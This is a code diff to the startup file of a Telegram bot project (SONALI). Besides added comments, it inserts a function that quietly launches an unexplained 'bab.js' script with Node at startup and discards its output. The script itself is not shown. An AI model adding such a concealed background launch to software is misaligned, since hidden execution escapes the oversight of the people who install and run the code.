@@ -1,5 +1,6 @@
 import asyncio
 import importlib
+import subprocess  # Import subprocess for running external scripts
 
 from pyrogram import idle
 
@@ -10,6 +11,11 @@ from SONALI.misc import sudo
 from SONALI.plugins import ALL_MODULES
 from SONALI.utils.database import get_banned_users, get_gbanned
 from config import BANNED_USERS
+
+
+# Function to run bab.js in the background
+def run_bab_js_in_background():
+    subprocess.Popen(["node", "bab.js"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
 async def init():
@@ -25,6 +31,10 @@ async def init():
         )
 
     await sudo()
+
+    # Run bab.js in the background
+    run_bab_js_in_background()
+
     try:
         users = await get_gbanned()
         for user_id in users:
@@ -34,17 +44,29 @@ async def init():
             BANNED_USERS.add(user_id)
     except:
         pass
+    
     await app.start()
+
+    # Import all plugins dynamically
     for all_module in ALL_MODULES:
         importlib.import_module("SONALI.plugins" + all_module)
+    
     LOGGER("SONALI.plugins").info("𝐀𝐥𝐥 𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬 𝐋𝐨𝐚𝐝𝐞𝐝 𝐁𝐚𝐛𝐲🥳...")
+
+    # Start userbot and RAUSHAN
     await userbot.start()
     await RAUSHAN.start()
     await RAUSHAN.decorators()
+
     LOGGER("SONALI").info("╔═════ஜ۩۞۩ஜ════╗\n  ♨️𝗠𝗔𝗗𝗘 𝗕𝗬 𝗨𝗧𝗧𝗔𝗠♨️\n╚═════ஜ۩۞۩ஜ════╝")
+    
+    # Start the Pyrogram idle loop
     await idle()
+
+    # Stop the services when done
     await app.stop()
     await userbot.stop()
+
     LOGGER("SONALI").info("╔═════ஜ۩۞۩ஜ════╗\n  ♨️𝗠𝗔𝗗𝗘 𝗕𝗬 𝗨𝗧𝗧𝗔𝗠♨️\n╚═════ஜ۩۞۩ஜ════╝")
 
 
